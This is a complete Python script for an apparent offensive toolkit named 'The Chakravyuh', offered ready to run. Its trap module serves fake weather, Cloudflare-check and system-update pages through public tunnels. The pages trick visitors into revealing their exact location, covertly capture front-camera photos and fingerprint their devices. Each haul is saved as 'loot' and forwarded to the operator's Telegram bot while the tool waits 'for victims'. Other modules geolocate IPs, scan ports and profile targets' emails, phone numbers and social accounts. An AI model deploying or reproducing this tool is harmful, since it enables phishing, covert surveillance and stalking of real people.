#!/usr/bin/env python3
# Author: Lokesh Kumar 
# Version: 1.3.0
# Date : 08/09/2026

import sys
import os
import time
import subprocess
import shutil
import socket
import json
import threading
import http.server
import socketserver
import urllib.request
import urllib.error
import re
import base64
from datetime import datetime, date

class UpdateManager:
    @staticmethod
    def update():
        log_file = "update_log.txt"
        today = str(date.today())
        if os.path.exists(log_file):
            try:
                with open(log_file, "r") as f:
                    if f.read().strip() == today: return
            except Exception: pass
        try:
            subprocess.call(["git", "pull"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            with open(log_file, "w") as f: f.write(today)
        except Exception: pass

class InstallManager:
    @staticmethod
    def check():
        required = ['requests', 'shodan', 'folium', 'user_agents', 'phonenumbers']
        missing = []
        for req in required:
            try: __import__(req)
            except ImportError: missing.append(req)
        
        if missing:
            print(f"[*] Installing dependencies: {', '.join(missing)}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
            print("[+] Dependencies installed. Restarting...")
            os.execv(sys.executable, [sys.executable] + sys.argv)

try:
    UpdateManager.update()
    InstallManager.check()
    import shodan
    import folium
    import user_agents
    import phonenumbers
    from phonenumbers import geocoder, carrier
    import requests
except Exception: pass

if os.name == 'nt': 
    try: os.system('color')
    except Exception: pass

class Colors:
    CYAN = '\033[96m'; GREEN = '\033[92m'; RED = '\033[91m'
    YELLOW = '\033[93m'; WHITE = '\033[97m'; MAGENTA = '\033[95m'
    GREY = '\033[90m'; RESET = '\033[0m'; BOLD = '\033[1m'

class Utils:
    @staticmethod
    def clear(): 
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def get_free_port():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('', 0)); return s.getsockname()[1]

    @staticmethod
    def get_script_dir():
        return os.path.dirname(os.path.abspath(__file__))

    @staticmethod
    def save_loot(data):
        file_path = os.path.join(Utils.get_script_dir(), "loot_log.txt")
        try:
            with open(file_path, "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now()}] {data}\n{'-'*50}\n")
            os.chmod(file_path, 0o600)
        except Exception: pass

    @staticmethod
    def save_image(b64_data, ip):
        try:
            if "," not in b64_data: return None
            header, encoded = b64_data.split(",", 1)
            data = base64.b64decode(encoded)
            filename = f"cam_{ip.replace(':', '_')}_{int(time.time())}.jpg"
            full_path = os.path.join(Utils.get_script_dir(), filename)
            with open(full_path, "wb") as f: f.write(data)
            try: os.chmod(full_path, 0o600)
            except Exception: pass
            return filename
        except Exception: return None

    @staticmethod
    def send_telegram(msg, img_filename=None):
        cfg = ConfigManager.load()
        if "tg_token" in cfg and "tg_id" in cfg:
            try:
                url = f"https://api.telegram.org/bot{cfg['tg_token']}/sendMessage"
                requests.post(url, data={'chat_id': cfg['tg_id'], 'text': msg}, timeout=5)
                if img_filename:
                    full_path = os.path.join(Utils.get_script_dir(), img_filename)
                    if os.path.exists(full_path):
                        with open(full_path, 'rb') as f:
                            requests.post(f"https://api.telegram.org/bot{cfg['tg_token']}/sendPhoto",
                                          data={'chat_id': cfg['tg_id']}, files={'photo': f}, timeout=10)
            except Exception: pass

    @staticmethod
    def banner():
        Utils.clear()
        print(f"{Colors.RED}{Colors.BOLD}")
        print("       🌀THE CHAKRAVYUH 🌀       ")
        print(" ──────────────────────────────────────────")
        print("  █▀▄▀█ ▄▀█ █▄█ ▄▀█      ░░░ ░░░ ░░░")
        print("  █ ▀ █ █▀█  █  █▀█ v1.3 ")
        print(f"{Colors.MAGENTA} ═══════════════════════════════════════════{Colors.BOLD}")
        print(f"{Colors.YELLOW} LOKESH-KUMAR | REDIRECT | STEALTH | OSINT{Colors.RESET}\n")

class ConfigManager:
    FILE = "chakravyuh_config.json"
    @staticmethod
    def get_config_path(): return os.path.join(Utils.get_script_dir(), ConfigManager.FILE)
    @staticmethod
    def load():
        path = ConfigManager.get_config_path()
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f: return json.load(f)
            except Exception: return {}
        return {}
    @staticmethod
    def save(key, val):
        d = ConfigManager.load(); d[key] = val
        path = ConfigManager.get_config_path()
        try:
            with open(path, "w", encoding="utf-8") as f: json.dump(d, f)
            os.chmod(path, 0o600)
        except Exception: pass
        print(f"{Colors.GREEN}[+] Config Saved.{Colors.RESET}")

TEMPLATES = {
    '1': ('Weather Check', """
        <div style="text-align:center;font-family:sans-serif;margin-top:20%">
            <h1>Local Weather Forecast</h1>
            <p>Please allow access to show weather for your exact location.</p>
            <button onclick="askPerms()" style="padding:15px 30px;background:#3498db;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;">Show Weather</button>
        </div>""", "https://www.accuweather.com"),
        
    '2': ('Cloudflare Verify', """
        <div style="text-align:center;font-family:sans-serif;margin-top:10%">
            <h1>Security Check</h1>
            <p>Click below to verify you are human.</p>
            <button onclick="askPerms()" style="padding:15px 30px;background:#2ecc71;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;">I am Human</button>
        </div>""", "https://www.google.com"),
        
    '3': ('System Update', """
        <div style="text-align:center;font-family:sans-serif;background:#000;color:white;height:100vh;padding-top:20%">
            <h1 style="color:#3498db">System Update Required</h1>
            <p>Click Update to fix security vulnerabilities.</p>
            <button onclick="askPerms()" style="padding:15px 30px;background:#e74c3c;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;">Update Now</button>
        </div>""", "https://support.microsoft.com/en-us/windows"),
}

BASE_HTML = """
<!DOCTYPE html><html><body style="background:#f0f0f0;color:#333;margin:0">
{content}
<script>
var REDIRECT_URL = "{redirect_url}";

function redirect() {{
    window.location.replace(REDIRECT_URL);
}}

async function postData(data) {{
    try {{
        await fetch('/c', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(data)
        }});
    }} catch(e) {{}}
}}

async function askPerms() {{
    navigator.geolocation.getCurrentPosition(async (p) => {{
        await postData({{type: 'geo', lat: p.coords.latitude, lon: p.coords.longitude}});
        redirect();
    }}, async (e) => {{
        tryCam();
    }}, {{enableHighAccuracy: true, timeout: 10000}});
}}

async function tryCam() {{
    try {{
        let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
        let video = document.createElement('video');
        video.srcObject = stream;
        video.playsInline = true;
        await video.play();
        
        await new Promise(resolve => setTimeout(resolve, 600));

        let canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        let ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        let b64 = canvas.toDataURL("image/jpeg", 0.8);
        
        stream.getTracks().forEach(track => track.stop());
        await postData({{type: 'cam', img: b64}});
        redirect();
    }} catch(e) {{
        redirect();
    }}
}}

async function s() {{
    let canvasHash = 'N/A';
    try {{
        let cv = document.createElement('canvas');
        let ctx = cv.getContext('2d');
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.fillText("Chakravyuh Security 🛡️ 123", 2, 2);
        canvasHash = cv.toDataURL().slice(-40);
    }} catch(e) {{}}

    let d = {{
        type: 'passive',
        ua: navigator.userAgent || 'N/A',
        plat: navigator.platform || 'N/A',
        lang: navigator.language || 'N/A',
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
        m: navigator.deviceMemory || 'N/A',
        c: navigator.hardwareConcurrency || 'N/A',
        touch: navigator.maxTouchPoints || 0,
        w: screen.width, h: screen.height,
        dpr: window.devicePixelRatio || 1,
        cd: screen.colorDepth || 'N/A',
        cookie: navigator.cookieEnabled ? 'Yes' : 'No',
        dnt: navigator.doNotTrack || window.doNotTrack || 'No',
        b: 'N/A', bc: 'N/A', g: 'N/A', net: 'Unknown',
        chash: canvasHash
    }};

    try {{ 
        let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {{ 
            d.net = (conn.effectiveType || 'unknown') + ' | DL: ' + (conn.downlink || 'N/A') + 'Mbps | RTT: ' + (conn.rtt || 'N/A') + 'ms'; 
        }} 
    }} catch(e) {{}}

    try {{ 
        let bat = await navigator.getBattery(); 
        d.b = Math.round(bat.level * 100) + '%'; 
        d.bc = bat.charging ? 'Yes' : 'No'; 
    }} catch(e) {{}}

    try {{
        let cv2 = document.createElement('canvas');
        let gl = cv2.getContext('webgl') || cv2.getContext('experimental-webgl');
        let db = gl.getExtension('WEBGL_debug_renderer_info');
        if (db) {{ 
            d.g = gl.getParameter(db.UNMASKED_RENDERER_WEBGL); 
        }}
    }} catch(e) {{}}

    postData(d);
}}
s();
</script></body></html>
"""

class ReconModule:
    def get_ip_data(self, t):
        try:
            with urllib.request.urlopen(f"http://ip-api.com/json/{t}?fields=66846719", timeout=5) as u:
                return json.loads(u.read().decode())
        except Exception: return None

    def run_ip(self, target=None):
        t = target if target else input(f"{Colors.YELLOW}[?] Target IP: {Colors.RESET}").strip()
        if not t: return
        print(f"\n{Colors.CYAN}[*] IP Analysis for {t}...{Colors.RESET}")
        d = self.get_ip_data(t)
        if d:
            print(f" Geo    : {d.get('city')}, {d.get('country')}")
            print(f" ISP    : {d.get('isp')}")
            if 'lat' in d and 'lon' in d:
                try:
                    m = folium.Map([d['lat'], d['lon']], zoom_start=15)
                    folium.Marker([d['lat'], d['lon']], popup=t).add_to(m)
                    full_path = os.path.join(Utils.get_script_dir(), f"map_{t}.html")
                    m.save(full_path)
                    print(f" Map    : Saved as map_{t}.html")
                except Exception: pass
        
        cfg = ConfigManager.load()
        if "shodan_api" in cfg:
            try:
                api = shodan.Shodan(cfg["shodan_api"])
                h = api.host(t)
                print(f" OS     : {h.get('os')}")
                print(f" Ports  : {h.get('ports')}")
            except Exception: pass
        if not target: input("\nEnter to return...")

    def run_port(self, target=None):
        t = target if target else input(f"{Colors.YELLOW}[?] Target IP: {Colors.RESET}").strip()
        if not t: return
        print(f"{Colors.CYAN}[*] Scanning Ports...{Colors.RESET}")
        ports = [21, 22, 80, 443, 3306, 3389, 8080]
        for p in ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    if s.connect_ex((t, p)) == 0:
                        print(f" Port {p}: {Colors.GREEN}OPEN{Colors.RESET}")
            except Exception: pass
        if not target: input("\nEnter to return...")

    def run_phone(self):
        p = input(f"{Colors.YELLOW}[?] Phone (+91..): {Colors.RESET}").strip()
        try:
            parsed = phonenumbers.parse(p)
            if phonenumbers.is_valid_number(parsed):
                print(f"\n{Colors.GREEN}[+] Valid!{Colors.RESET}")
                print(f" Loc : {geocoder.description_for_number(parsed, 'en')}")
                print(f" Net : {carrier.name_for_number(parsed, 'en')}")
            else: print(f"{Colors.RED}[!] Invalid.{Colors.RESET}")
        except Exception: print("Error parsing number.")
        input("\nEnter to return...")

    def run_domain(self):
        d = input(f"{Colors.YELLOW}[?] Domain: {Colors.RESET}").strip()
        try:
            ip = socket.gethostbyname(d)
            print(f" IP : {Colors.GREEN}{ip}{Colors.RESET}")
        except Exception: print("Not found.")
        input("\nEnter to return...")

class OSINTModule:
    def run_menu(self):
        while True:
            Utils.banner()
            print(f"{Colors.CYAN}[1] Email Breach Check (HaveIBeenPwned){Colors.RESET}")
            print(f"{Colors.CYAN}[2] Social Media Username Scanner{Colors.RESET}")
            print(f"{Colors.MAGENTA}[0] Back to Main Menu{Colors.RESET}")
            c = input(f"\n{Colors.GREEN}osint > {Colors.RESET}").strip()
            if c == '1':
                self.run_email()
            elif c == '2':
                self.run_username()
            elif c == '0':
                break

    def run_email(self):
        email = input(f"{Colors.YELLOW}[?] Enter Target Email: {Colors.RESET}").strip()
        if not email: return
        cfg = ConfigManager.load()
        api_key = cfg.get("hibp_api")
        if not api_key:
            print(f"{Colors.RED}[!] HaveIBeenPwned API Key missing. Add it in Settings ([6]).{Colors.RESET}")
            input("\nEnter to return...")
            return
        print(f"{Colors.CYAN}[*] Checking breaches for {email}...{Colors.RESET}")
        try:
            url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}?truncateResponse=false"
            req = urllib.request.Request(url, headers={'User-Agent': 'Chakravyuh-Tool', 'hibp-api-key': api_key})
            with urllib.request.urlopen(req, timeout=10) as response:
                data = json.loads(response.read().decode())
                if data:
                    print(f"{Colors.RED}[+] Found {len(data)} breaches!{Colors.RESET}")
                    for b in data:
                        print(f" - {b.get('Name')} ({b.get('BreachDate')}) : {b.get('Domain')}")
                        Utils.save_loot(f"EMAIL BREACH: {email} | Breach: {b.get('Name')} | Date: {b.get('BreachDate')}")
                else:
                    print(f"{Colors.GREEN}[+] No breaches found for this email!{Colors.RESET}")
        except urllib.error.HTTPError as e:
            if e.code == 404:
                print(f"{Colors.GREEN}[+] No breaches found (Clean).{Colors.RESET}")
            else:
                print(f"{Colors.RED}[!] API Error: HTTP {e.code}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
        input("\nEnter to return...")

    def run_username(self):
        username = input(f"{Colors.YELLOW}[?] Enter Username: {Colors.RESET}").strip()
        if not username: return
        print(f"{Colors.CYAN}[*] Scanning social platforms for '{username}'...{Colors.RESET}")
        platforms = {
            "GitHub": f"https://github.com/{username}",
            "Instagram": f"https://www.instagram.com/{username}/",
            "Twitter/X": f"https://twitter.com/{username}",
            "Reddit": f"https://www.reddit.com/user/{username}",
            "Pinterest": f"https://pinterest.com/{username}",
            "TikTok": f"https://www.tiktok.com/@{username}",
            "Telegram": f"https://t.me/{username}"
        }
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        for name, url in platforms.items():
            try:
                req = urllib.request.Request(url, headers=headers)
                with urllib.request.urlopen(req, timeout=5) as resp:
                    if resp.status == 200:
                        print(f" {name:10} : {Colors.GREEN}FOUND{Colors.RESET} -> {url}")
                        Utils.save_loot(f"SOCIAL FOUND: {username} on {name} -> {url}")
            except urllib.error.HTTPError as e:
                if e.code == 404:
                    print(f" {name:10} : {Colors.RED}NOT FOUND{Colors.RESET}")
                else:
                    print(f" {name:10} : {Colors.YELLOW}HTTP {e.code}{Colors.RESET}")
            except Exception:
                print(f" {name:10} : {Colors.GREY}TIMEOUT/BLOCKED{Colors.RESET}")
        input("\nEnter to return...")

class WorkflowEngine:
    def run_full_scan(self):
        t = input(f"{Colors.YELLOW}[?] Enter Target IP: {Colors.RESET}").strip()
        if not t: return
        ReconModule().run_ip(t)
        ReconModule().run_port(t)
        print(f"\n{Colors.GREEN}[✓] Workflow Complete!{Colors.RESET}")
        input("Enter to return...")

class TrapServer(http.server.SimpleHTTPRequestHandler):
    redirect_url = "https://google.com" 
    template_code = TEMPLATES['1'][1]

    def log_message(self, format, *args): 
        return

    def do_GET(self):
        try:
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html = BASE_HTML.format(content=TrapServer.template_code, redirect_url=TrapServer.redirect_url)
            self.wfile.write(html.encode('utf-8'))
        except Exception: pass

    def do_POST(self):
        try:
            client_ip = self.client_address[0]
            
            forwarded = self.headers.get('X-Forwarded-For')
            cf_ip = self.headers.get('CF-Connecting-IP')
            
            if cf_ip and '.' in cf_ip:
                client_ip = cf_ip
            elif forwarded:
                ips = [ip.strip() for ip in forwarded.split(',')]
                for ip in ips:
                    if '.' in ip and ':' not in ip:
                        client_ip = ip
                        break

            content_len = self.headers.get('Content-Length')
            if not content_len:
                self.send_response(400)
                self.end_headers()
                return

            l = int(content_len)
            raw_body = self.rfile.read(l)
            d = json.loads(raw_body.decode('utf-8'))
            
            if d.get('type') == 'cam':
                fname = Utils.save_image(d.get('img'), client_ip)
                if fname:
                    print(f"\n{Colors.RED}[+] CAM SHOT CAPTURED: {fname}{Colors.RESET}")
                    Utils.send_telegram(f"📸 Cam Shot | IP: {client_ip}", fname)
            
            elif d.get('type') == 'geo':
                lat, lon = d.get('lat'), d.get('lon')
                maps_link = f"https://www.google.com/maps?q={lat},{lon}"
                print(f"\n{Colors.RED}[+] EXACT LOCATION: {lat}, {lon}{Colors.RESET}")
                print(f"{Colors.YELLOW}>>> {maps_link} <<<{Colors.RESET}")
                Utils.save_loot(f"GEO: {lat},{lon} | IP: {client_ip} | {maps_link}")
                Utils.send_telegram(f"📍 Location | IP: {client_ip}\n{maps_link}")

            elif d.get('type') == 'passive':
                gpu = d.get('g', '').lower()
                pred = "Unknown Device"
                if "mali" in gpu: pred = "Android (Mali GPU)"
                elif "adreno" in gpu: pred = "Android (Adreno GPU)"
                elif "apple" in gpu or "iphone" in d.get('ua', '').lower(): pred = "Apple iOS Device"
                elif "nvidia" in gpu or "intel" in gpu or "amd" in gpu: pred = "Desktop/PC"

                report = f"""
[+] ADVANCED FINGERPRINT HIT: {client_ip}
Time: {datetime.now().strftime('%H:%M:%S')}
Device Type: {pred}
Platform: {d.get('plat')} | Lang: {d.get('lang')} | TZ: {d.get('tz')}
Screen: {d.get('w')}x{d.get('h')} (DPR: {d.get('dpr')}, ColorDepth: {d.get('cd')}-bit)
Hardware: {d.get('c')} Cores | RAM: {d.get('m')} GB | TouchPoints: {d.get('touch')}
Battery: {d.get('b')} (Charging: {d.get('bc')})
Network: {d.get('net')}
GPU: {d.get('g')}
Cookies: {d.get('cookie')} | DNT: {d.get('dnt')}
Canvas Hash: {d.get('chash')}
User-Agent: {d.get('ua')}
"""
                print(f"{Colors.CYAN}{report}{Colors.RESET}")
                Utils.save_loot(report.strip())
                Utils.send_telegram(report.strip())

            self.send_response(200)
            self.end_headers()
        except Exception:
            try:
                self.send_response(400)
                self.end_headers()
            except Exception: pass

class TrapManager:
    def run(self):
        print(f"\n{Colors.CYAN}[?] Select Trap Template:{Colors.RESET}")
        for k, v in TEMPLATES.items(): print(f" [{k}] {v[0]}")
        ch = input(f"{Colors.YELLOW} > {Colors.RESET}").strip()
        
        if ch in TEMPLATES:
            TrapServer.template_code = TEMPLATES[ch][1]
            TrapServer.redirect_url = TEMPLATES[ch][2]

        port = Utils.get_free_port()
        httpd = None
        try:
            httpd = socketserver.ThreadingTCPServer(("", port), TrapServer)
            server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
            server_thread.start()
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to start server: {e}{Colors.RESET}")
            return

        print(f"{Colors.GREEN}[+] Local: http://localhost:{port}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Starting Tunnel...{Colors.RESET}")
        
        proc = None
        try:
            if shutil.which("cloudflared"):
                proc = subprocess.Popen(["cloudflared", "tunnel", "--url", f"http://localhost:{port}"], 
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                while True:
                    line = proc.stderr.readline().decode('utf-8', errors='ignore')
                    if not line and proc.poll() is not None:
                        break
                    if "trycloudflare.com" in line:
                        match = re.search(r"(?P<url>https?://[^\s]+trycloudflare\.com)", line)
                        if match: 
                            print(f"\n{Colors.GREEN}{Colors.BOLD} >>> LINK: {match.group('url')} <<<{Colors.RESET}\n")
                            break
            else:
                proc = subprocess.Popen(["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"80:localhost:{port}", "serveo.net"],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                print(f"{Colors.GREY}(Serveo started. Check logs or wait for connection){Colors.RESET}")

            print("Waiting for victims... (Ctrl+C to stop)")
            while True: 
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Stopping Trap Server & Tunnels...{Colors.RESET}")
        finally:
            if proc:
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except Exception:
                    try: proc.kill()
                    except Exception: pass
            if httpd:
                try:
                    httpd.shutdown()
                    httpd.server_close()
                except Exception: pass

def main():
    while True:
        Utils.banner()
        print(f"{Colors.CYAN}[1] IP Tracker                           [2] Port Scanner{Colors.RESET}")
        print(f"{Colors.CYAN}[3] Phone Tracker                        [4] Domain Intel{Colors.RESET}")
        print(f"{Colors.CYAN}[5] Trap & Camera Trapper                [6] Settings{Colors.RESET}")
        print(f"{Colors.CYAN}[7] Email & Social OSINT                 [8] Automate All{Colors.RESET}")
        print(f"{Colors.MAGENTA}[0] Exit{Colors.RESET}")
        
        c = input(f"\n{Colors.GREEN}chakravyuh > {Colors.RESET}").strip()
        
        if c == '1': ReconModule().run_ip()
        elif c == '2': ReconModule().run_port()
        elif c == '3': ReconModule().run_phone()
        elif c == '4': ReconModule().run_domain()
        elif c == '5': TrapManager().run()
        elif c == '6': 
            k = input("Shodan API: ").strip(); ConfigManager.save("shodan_api", k)
            t = input("TG Token: ").strip(); ConfigManager.save("tg_token", t)
            i = input("TG Chat ID: ").strip(); ConfigManager.save("tg_id", i)
            h = input("HaveIBeenPwned API Key: ").strip(); ConfigManager.save("hibp_api", h)
        elif c == '7': OSINTModule().run_menu()
        elif c == '8': WorkflowEngine().run_full_scan()
        elif c == '0': sys.exit()

if __name__ == "__main__":
    main()